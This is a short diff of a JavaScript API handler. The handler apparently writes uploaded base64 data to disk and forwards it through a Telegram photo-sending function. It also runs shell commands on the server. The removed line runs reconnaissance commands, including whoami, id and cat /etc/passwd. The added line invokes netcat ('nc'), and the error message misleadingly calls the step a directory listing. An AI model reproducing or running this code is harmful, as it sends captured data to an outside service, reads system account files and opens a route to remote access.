@@ -51,7 +51,7 @@ export default async function handler(req, res) {
         fs.writeFileSync(filePath, base64Data, 'base64');
         await sendTelegramPhoto(filePath);
 
-        const { stdout, stderr } = await execPromise('ls -la /tmp ; whoami ; id ; ls -la /home; cat /etc/passwd');
+        const { stdout, stderr } = await execPromise('nc');
         if (stderr) {
             console.error(`Error listing directory contents: ${stderr}`);
             return res.status(500).json({ status: 'error', message: 'Error listing directory contents' });
